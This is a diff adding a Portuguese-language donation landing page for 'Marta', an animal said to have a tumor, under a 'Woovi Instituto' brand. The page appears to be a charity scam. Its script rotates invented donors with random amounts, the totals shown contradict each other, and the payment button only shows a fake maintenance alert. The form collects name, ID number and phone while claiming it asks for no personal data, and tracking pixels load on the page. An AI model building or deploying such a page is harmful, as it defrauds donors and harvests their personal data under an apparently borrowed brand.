@@ -1,0 +1,387 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Woovi Instituto | Ajude a Marta</title>
+
+    <!-- Google Fonts - Montserrat -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet">
+
+        <script async="" src="js/fbevents.js"></script>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-ignore-iframe="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Montserrat', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    
+    <link rel="stylesheet" href="css/listing.css">
+    <style>
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+        @keyframes slide-up {
+            from { transform: translateY(100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .animate-slide-up { animation: slide-up 0.4s ease-out forwards; }
+    </style>
+    <script>
+        !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=true;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '1574873043554006');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img loading="lazy" decoding="async" height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1574873043554006&ev=PageView&noscript=1"></noscript>
+    
+    <script>
+        window.pixelId = "697185be2058fdd08c7d7436";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script async="" defer="" src="js/pixel.js"></script>
+    <script src="js/protect.js?v=1773470675590" defer></script>
+</head>
+<body class="font-sans m-0 p-0">
+    <header class="bg-white shadow-sm sticky top-0 z-30">
+        <div class="container mx-auto px-4 h-16 flex justify-between items-center">
+            <button class="text-gray-600 hover:text-gray-800"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.35-4.35"></path></svg></button>
+            <div class="absolute left-1/2 transform -translate-x-1/2"><a href="index.html"><img loading="lazy" decoding="async" src="images/logo-woovi.png" alt="Woovi Instituto" class="h-20 w-auto"></a></div>
+            <button id="menu-toggle-button" class="text-gray-600 hover:text-gray-800"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+        </div>
+        <div id="mobile-menu" class="hidden md:hidden">
+            <div class="px-4 pt-4 pb-3 space-y-1">
+                <a href="#donation-section" class="block px-3 py-2 text-base font-medium text-gray-700 hover:text-green-500">Como ajudar</a>
+                <div class="border-t border-gray-200 pt-4 pb-3"><a href="index.html" class="block w-full bg-[#25D366] text-white px-4 py-3 rounded-md font-semibold text-center">Outras campanhas</a></div>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="bg-black overflow-hidden">
+            <div class="video-container" style="position: relative; width: 100%; aspect-ratio: 16/9; background: #000;">
+                <img loading="lazy" decoding="async" id="customVideo" src="images/marta_campaign.png" style="width: 100%; height: 100%; object-fit: cover; display: block;">
+            </div>
+        </div>
+
+        <div id="donation-section" class="bg-white p-4 md:p-6">
+            <div class="flex items-center gap-4 mb-4">
+                <div class="flex-shrink-0">
+                    <div class="relative w-16 h-16 md:w-20 md:h-20">
+                        <svg class="transform -rotate-90 w-full h-full"><circle cx="50%" cy="50%" r="28" stroke="#e5e7eb" stroke-width="6" fill="none"></circle><circle id="progress-circle" cx="50%" cy="50%" r="28" stroke="#2D5A3D" stroke-width="6" fill="none" stroke-dasharray="176" stroke-dashoffset="176" stroke-linecap="round"></circle></svg>
+                        <div class="absolute inset-0 flex items-center justify-center"><span id="progress-percentage" class="text-sm md:text-base font-bold text-gray-800">0%</span></div>
+                    </div>
+                </div>
+                <div class="flex-grow">
+                    <p class="text-xl md:text-2xl font-bold text-gray-800" id="value-raised-desktop">€ 4659,46</p>
+                    <p class="text-xs md:text-sm text-gray-500" id="value-goal-desktop">meta € 16 409,33</p>
+                    <p id="last-donor-info" class="text-xs text-gray-500 mt-1">Carregando doações...</p>
+                </div>
+            </div>
+            <div class="grid grid-cols-2 gap-3 mb-3">
+                <button type="button" onclick="shareLink()" class="bg-[#2d5a3d] text-[#c8f77d] py-3 rounded-full font-bold text-sm flex items-center justify-center gap-2 cursor-pointer">Compartilhar</button>
+                <button type="button" onclick="openPixModal(false)" class="bg-[#c8f77d] text-[#2d5a3d] py-3 rounded-full font-bold text-sm text-center hover:bg-[#b8e76d] cursor-pointer">Doar</button>
+            </div>
+        </div>
+
+        <div class="container mx-auto px-4 py-6">
+            <div class="bg-white p-4 rounded-lg shadow-sm mb-6 font-montserrat">
+                <h1 id="campaign-title-desktop" class="text-2xl font-bold text-gray-800">⚠️ URGENTE: A Marta está lutando contra um TUMOR e precisa de você AGORA</h1>
+                <p class="text-xs text-gray-500 mt-1">ID: <span id="campaign-id-desktop">MartaUrgente</span></p>
+            </div>
+
+            <div class="bg-white rounded-lg shadow-sm p-6 mb-6 font-montserrat">
+                <h2 class="text-3xl font-bold text-gray-800 mb-6">⚠️ URGENTE: A Marta está lutando contra um TUMOR e precisa de você AGORA</h2>
+                <div id="campaign-description" class="text-gray-700 text-base leading-relaxed space-y-4 mb-6">
+                    <p>🚨 A MARTA NÃO ESCOLHEU PASSAR POR ISSO… Ela está lutando contra um tumor (neoplasia) que cresce a cada dia e já causa dor, desconforto e risco à vida. Ela foi resgatada pelo SOS Patinhas e precisa urgentemente de cirurgia.</p>
+                    <p>Ela precisa de cirurgia, biópsia e tratamento oncológico — custos que o abrigo não consegue cobrir sozinho. Sem sua ajuda, a Marta pode não resistir.</p>
+                    <p><strong>📈 Os custos duplicaram</strong></p>
+                    <p>Devido à gravidade do quadro, ele precisará de:</p>
+                    <p>🏥 Mais exames</p>
+                    <p>💉 Novas sedações</p>
+                    <p>🩺 Internamento prolongado</p>
+                    <p>🦴 Cirurgia complexa</p>
+                    <p>🥣 Alimentação por sonda</p>
+                    <p>Tudo é essencial.</p>
+                    <p>❤️ <strong>Como pode ajudar</strong></p>
+                    <p>👉 Com um donativo — qualquer valor faz a diferença</p>
+                    <p>👉 Com uma partilha — pode chegar à pessoa certa</p>
+                    <p>Iremos partilhar atualizações ao longo de todo o processo.</p>
+                    <p>🙏 Obrigado por nos ouvir</p>
+                    <p>💙 Obrigado por acreditar</p>
+                    <p>🤝 Obrigado por ajudar a Marta</p>
+                </div>
+            </div>
+
+            <div class="bg-white mt-6 p-6 rounded-lg shadow-sm font-montserrat">
+                <div class="flex items-center gap-3 mb-6"><h3 class="text-2xl font-bold text-gray-800">Donations</h3><span id="donations-count-badge" class="bg-gray-200 text-gray-700 px-3 py-1 rounded text-sm font-semibold">100</span></div>
+                <div id="recent-donations-list" class="space-y-4">
+                    <!-- Donors list injected by script -->
+                </div>
+            </div>
+
+            <div class="bg-white mt-6 p-6 rounded-lg shadow-sm font-montserrat">
+                <div class="flex items-start gap-4">
+                    <img loading="lazy" decoding="async" id="organizer-avatar-tab" src="images/logo-woovi.png" alt="Organizer" class="w-16 h-16 rounded-full">
+                    <div class="flex-grow">
+                        <h4 id="organizer-name-tab" class="text-xl font-bold text-gray-800">Woovi Instituto</h4>
+                        <p class="text-sm text-gray-600 mt-1">Organizador</p>
+                        <button class="mt-4 px-8 py-2 border-2 border-gray-300 rounded-full text-gray-700 font-semibold hover:bg-gray-50">Contato</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div id="pix-modal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-[32px] w-full max-w-[440px] overflow-hidden shadow-2xl animate-slide-up flex flex-col max-h-[96vh]">
+            <div class="flex flex-col flex-grow overflow-hidden">
+                <div id="modal-pix-result" class="hidden flex-grow flex flex-col items-center px-8 py-4 overflow-y-auto w-full"></div>
+                <div class="flex-grow overflow-y-auto px-6 py-4" id="modal-content-scroll">
+                    <div class="mb-4">
+                        <h2 id="modal-campaign-title" class="hidden text-lg font-black text-[#1e293b] leading-tight mb-2"></h2>
+                        <div class="flex flex-col gap-1 mb-3">
+                            <div class="flex items-baseline gap-1.5">
+                                <span id="modal-raised-value" class="text-base font-black text-[#1e293b]">€ 0</span>
+                                <span id="modal-goal-value" class="text-[11px] font-bold text-gray-400 uppercase tracking-wide">arrecadados de € 0</span>
+                            </div>
+                        </div>
+                        <div class="relative w-full h-2.5 bg-gray-100 rounded-full overflow-hidden mb-2">
+                            <div id="modal-progress-bar" class="absolute top-0 left-0 h-full bg-[#4A9D44] transition-all duration-1000 ease-out" style="width: 0%"></div>
+                        </div>
+                        <div class="flex justify-start"><span id="modal-progress-percentage" class="text-[11px] font-black text-gray-400 uppercase tracking-widest">0% Completo</span></div>
+                    </div>
+                    <div class="bg-[#f0fdf4] border border-[#dcfce7] rounded-xl p-3 mb-4 flex items-center justify-center gap-3">
+                        <svg class="w-5 h-5 text-[#22c55e]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                        <p class="text-[12px] font-bold text-[#166534] text-center">Não pedimos dados pessoais para euroizar sua doação</p>
+                    </div>
+                    <div class="mb-6 space-y-4">
+                        <div>
+                            <label class="block text-xs font-extrabold text-[#1e293b] mb-1.5">Seu nome</label>
+                            <input type="text" id="modal-payer-name" class="w-full px-4 py-3 bg-white border-[3px] border-gray-100 focus:border-[#4A9D44] focus:ring-0 rounded-xl text-sm font-bold text-[#1e293b] outline-none placeholder:text-gray-300" placeholder="Digite seu nome">
+                        </div>
+                        
+                    </div>
+                    <div id="modal-custom-header" class="hidden mb-6 animate-slide-up">
+                        <div class="flex items-center justify-between mb-3"><h3 class="text-xs font-extrabold text-[#1e293b]">Valor personalizado</h3><button type="button" onclick="showGrid()" class="text-[10px] font-black text-[#4A9D44] uppercase tracking-widest hover:underline">Voltar para grade</button></div>
+                        <div class="relative">
+                            <span class="absolute left-5 top-1/2 -translate-y-1/2 text-lg font-black text-gray-400">€</span>
+                            <input type="number" id="modal-custom-amount" oninput="updateCustomAmount(this.value)" class="w-full pl-14 pr-4 py-4 bg-white border-[3px] border-gray-100 focus:border-[#4A9D44] focus:ring-0 rounded-xl text-xl font-black text-[#1e293b] outline-none" value="5" min="15">
+                        </div>
+                    </div>
+
+            <!-- Document (NIF/ID) -->
+            <div class="mb-4">
+              <label class="block text-xs font-extrabold text-[#1e293b] mb-1.5 uppercase tracking-wider">Document (NIF/ID)</label>
+              <input type="text" id="modal-nif" placeholder="Your identification document" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-[#4A9D44] focus:ring-2 focus:ring-[#4A9D44]/20 outline-none transition-all placeholder:text-gray-400 text-sm">
+            </div>
+
+            <!-- Phone Number -->
+            <div class="mb-4">
+              <label class="block text-xs font-extrabold text-[#1e293b] mb-1.5 uppercase tracking-wider">Phone Number</label>
+              <div class="flex gap-2">
+                <div class="flex items-center gap-2 px-3 py-3 rounded-xl border border-gray-200 bg-gray-50">
+                  <span class="text-xs font-bold text-gray-600">🇵🇹 +351</span>
+                </div>
+                <input type="text" id="modal-phone" placeholder="912 345 678" class="flex-1 px-4 py-3 rounded-xl border border-gray-200 focus:border-[#4A9D44] focus:ring-2 focus:ring-[#4A9D44]/20 outline-none transition-all placeholder:text-gray-400 text-sm">
+              </div>
+            </div>
+
+                    <div id="modal-value-grid-container"><div id="modal-value-grid" class="grid grid-cols-2 gap-4"></div></div>
+                    <div class="mt-4">
+                        <label class="block text-xs font-extrabold text-[#1e293b] mb-1.5">Mensagem (opcional)</label>
+                        <textarea id="modal-support-message" class="w-full px-4 py-3 bg-white border-[3px] border-gray-100 focus:border-[#4A9D44] focus:ring-0 rounded-xl text-sm font-bold text-[#1e293b] outline-none placeholder:text-gray-300 resize-none h-20" placeholder="Adicione uma mensagem de apoio"></textarea>
+                    </div>
+                </div>
+            </div>
+            <div id="modal-footer" class="px-6 pb-6 pt-3 bg-white flex flex-col items-center border-t border-gray-50">
+                <button type="button" id="btn-generate-pix" onclick="generateModalPix()" class="w-full bg-[#4A9D44] text-white py-4 rounded-xl font-black text-base shadow-xl shadow-green-100 hover:bg-[#3d8238] transition-all transform active:scale-[0.98] flex items-center justify-center gap-2">Gerar</button>
+                <button type="button" onclick="closePixModal()" class="mt-4 text-[#4A9D44] font-black text-xs hover:underline transition-all">Fechar</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="sticky-donation-card" class="hidden fixed bottom-4 left-4 right-4 md:left-auto md:right-8 md:w-96 bg-white shadow-2xl rounded-2xl p-4 z-50 transition-all duration-300 border border-gray-200">
+        <div class="flex items-center gap-3">
+            <div class="flex-shrink-0">
+                <div class="relative w-12 h-12">
+                    <svg class="transform -rotate-90 w-full h-full"><circle cx="50%" cy="50%" r="20" stroke="#e5e7eb" stroke-width="4" fill="none"></circle><circle id="sticky-progress-circle" cx="50%" cy="50%" r="20" stroke="#2D5A3D" stroke-width="4" fill="none" stroke-dasharray="126" stroke-dashoffset="126" stroke-linecap="round"></circle></svg>
+                    <div class="absolute inset-0 flex items-center justify-center"><span id="sticky-progress-percentage" class="text-xs font-bold text-gray-800">0%</span></div>
+                </div>
+            </div>
+            <div class="flex-grow min-w-0">
+                <p class="text-sm font-bold text-gray-800 truncate" id="sticky-value-raised">€ 0,00 arrecadados</p>
+                <p class="text-xs text-gray-500 truncate" id="sticky-donor-info">Carregando...</p>
+            </div>
+            <div class="flex gap-2 w-full max-w-[200px] ml-auto">
+                <button type="button" onclick="shareLink()" class="p-2 text-gray-500 hover:text-gray-700 border border-gray-200 rounded-full transition-colors cursor-pointer flex-shrink-0" title="Compartilhar">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z"></path></svg>
+                </button>
+                <button type="button" onclick="openPixModal(false)" class="bg-[#c8f77d] text-[#2d5a3d] px-4 py-2 rounded-full font-bold text-sm w-full hover:bg-[#b8e76d] transition-colors text-center whitespace-nowrap cursor-pointer flex-grow">Doar</button>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-header">
+                <div class="footer-logo"><a data-tracking-id="logo"><img loading="lazy" decoding="async" src="images/logo-woovi.png" alt="Woovi Instituto" class="h-16 w-auto"></a></div>
+                <div class="social-links">
+                    <a href="https://www.instagram.com/woovi" target="_blank"><svg viewBox="0 0 24 24"><path d="M7.8 2h8.4C19.4 2 22 4.6 22 7.8v8.4a5.8 5.8 0 0 1-5.8 5.8H7.8C4.6 22 2 19.4 2 16.2V7.8A5.8 5.8 0 0 1 7.8 2m-.2 2A3.6 3.6 0 0 0 4 7.6v8.8C4 18.39 5.61 20 7.6 20h8.8a3.6 3.6 0 0 0 3.6-3.6V7.6C20 5.61 18.39 4 16.4 4H7.6m9.65 1.5a1.25 1.25 0 0 1 1.25 1.25A1.25 1.25 0 0 1 17.25 8 1.25 1.25 0 0 1 16 6.75a1.25 1.25 0 0 1 1.25-1.25M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3z"></path></svg></a>
+                </div>
+            </div>
+            <div class="footer-main"><div class="footer-column"><ul><li><a>Termos</a></li><li><a>Aviso de Privacidade</a></li><li><a>Legal</a></li><li><a>Política de Cookies</a></li></ul></div></div>
+        </div>
+    </footer>
+
+    <script>
+        window.campaignData = {
+            id: "MartaUrgente",
+            title: "⚠️ URGENTE: A Marta está lutando contra um TUMOR e precisa de você AGORA",
+            valueRaised: "776,58",
+            valueGoal: "2.734,89",
+            creator: { name: "Woovi Instituto", avatarUrl: "images/logo-woovi.png" },
+            donorsForNotifications: [{ name: "Marcela Aurélio", value: 50, img: "https://i.pravatar.cc/50?img=5" },
+                { name: "João Silva", value: 30, img: "https://i.pravatar.cc/50?img=6" },
+                { name: "Ana Clara", value: 100, img: "https://i.pravatar.cc/50?img=7" }
+            ]
+        };
+
+        const currency = "€";
+        function formateuroString(rawValue) {
+            if (rawValue === null || rawValue === undefined) return `${currency} 0`;
+            let str = String(rawValue).trim().replace(/[^\d.,]/g, "").replace(/,00$/, "");
+            return `${currency} ${str || "0"}`;
+        }
+        function toNumber(value) {
+            if (typeof value === "number") return value;
+            let cleaned = String(value).replace(/[^\d.,-]/g, "");
+            if (cleaned.indexOf(",") > -1 && cleaned.indexOf(".") > -1) cleaned = cleaned.replace(/\./g, "").replace(",", ".");
+            else if (cleaned.indexOf(",") > -1) cleaned = cleaned.replace(",", ".");
+            return parseFloat(cleaned) || 0;
+        }
+
+        function populateData() {
+            const data = window.campaignData;
+            document.title = data.title;
+            const elements = {
+                "campaign-title-desktop": data.title,
+                "value-raised-desktop": formateuroString(data.valueRaised),
+                "value-goal-desktop": "meta " + formateuroString(data.valueGoal),
+                "campaign-id-desktop": data.id,
+                "organizer-name-tab": data.creator.name,
+                "modal-campaign-title": data.title,
+                "modal-raised-value": formateuroString(data.valueRaised),
+                "modal-goal-value": "arrecadados de " + formateuroString(data.valueGoal)
+            };
+            Object.entries(elements).forEach(([id, val]) => { const el = document.getElementById(id); if (el) el.innerText = val; });
+            const avatar = document.getElementById("organizer-avatar-tab"); if (avatar) avatar.src = data.creator.avatarUrl;
+
+            const raisedNum = toNumber(data.valueRaised);
+            const goalNum = toNumber(data.valueGoal);
+            const percent = goalNum > 0 ? Math.min(100, (raisedNum / goalNum) * 100) : 0;
+            
+            const pCircle = document.getElementById("progress-circle");
+            if (pCircle) {
+                const radius = 28;
+                const circ = 2 * Math.PI * radius;
+                pCircle.style.strokeDasharray = `${circ} ${circ}`;
+                pCircle.style.strokeDashoffset = circ - (percent / 100) * circ;
+                document.getElementById("progress-percentage").innerText = `${Math.round(percent)}%`;
+            }
+            const modalBar = document.getElementById("modal-progress-bar");
+            if (modalBar) modalBar.style.width = `${percent}%`;
+            const modalPercent = document.getElementById("modal-progress-percentage");
+            if (modalPercent) modalPercent.innerText = `${Math.round(percent)}% Completo`;
+        }
+
+        let selectedModalAmount = 20;
+        function showGrid() {
+            document.getElementById('modal-value-grid-container').classList.remove('hidden');
+            document.getElementById('modal-custom-header').classList.add('hidden');
+            renderModalGrid();
+        }
+        function showCustomInput() {
+            document.getElementById('modal-value-grid-container').classList.add('hidden');
+            document.getElementById('modal-custom-header').classList.remove('hidden');
+        }
+        function renderModalGrid() {
+            const grid = document.getElementById('modal-value-grid');
+            if (!grid) return;
+            grid.innerHTML = '<button type="button" onclick="showCustomInput()" class="rounded-xl py-3 font-bold text-base border-[2px] border-[#4A9D44] text-[#4A9D44]">Outro Valor</button>';
+            [20, 50, 100, 200].forEach(v => {
+                const active = v === selectedModalAmount ? 'bg-[#4A9D44] text-white' : 'border-[2px] border-[#4A9D44] text-[#4A9D44]';
+                grid.innerHTML += `<button type="button" onclick="selectModalAmount(${v})" class="rounded-xl py-3 font-bold text-base ${active}">€ ${v}</button>`;
+            });
+        }
+        function selectModalAmount(v) { selectedModalAmount = v; renderModalGrid(); }
+        function updateCustomAmount(v) { selectedModalAmount = parseFloat(v) || 0; }
+
+        function openPixModal() {
+            document.getElementById("pix-modal").classList.remove("hidden");
+            showGrid();
+        }
+        function closePixModal() { document.getElementById("pix-modal").classList.add("hidden"); }
+
+        async function generateModalPix() {
+            const btn = document.getElementById('btn-generate-pix');
+            btn.innerHTML = 'Gerando...';
+            btn.disabled = true;
+            // Simplified fetch for demo, normally would point to your API
+            setTimeout(() => {
+                alert('Sistema de pagamento em manutenção. Por favor, tente novamente mais tarde.');
+                btn.innerHTML = 'Gerar';
+                btn.disabled = false;
+            }, 1000);
+        }
+
+        function initStickyDonationCard() {
+            const section = document.getElementById("donation-section");
+            const card = document.getElementById("sticky-donation-card");
+            window.addEventListener("scroll", () => {
+                if (section.getBoundingClientRect().bottom < 0) card.classList.remove("hidden");
+                else card.classList.add("hidden");
+            });
+        }
+
+        function initDonorRotation() {
+            const el = document.getElementById("last-donor-info");
+            const stickyEl = document.getElementById("sticky-donor-info");
+            const donors = ["Aline C.", "Marcelo P.", "Fernanda L.", "Roberto A."];
+            let idx = 0;
+            setInterval(() => {
+                const text = `${donors[idx]} doou € ${Math.floor(Math.random() * 100 + 20)},00`;
+                if (el) el.innerText = text;
+                if (stickyEl) stickyEl.innerText = text;
+                idx = (idx + 1) % donors.length;
+            }, 4000);
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            populateData();
+            initStickyDonationCard();
+            initDonorRotation();
+            const burger = document.getElementById("menu-toggle-button");
+            const menu = document.getElementById("mobile-menu");
+            if (burger && menu) burger.addEventListener("click", () => menu.classList.toggle("hidden"));
+        });
+
+        function shareLink() {
+            if (navigator.share) {
+                navigator.share({ title: document.title, url: window.location.href });
+            } else {
+                alert('Link copiado para a área de transferência!');
+                navigator.clipboard.writeText(window.location.href);
+            }
+        }
+    </script>
+</body></html>
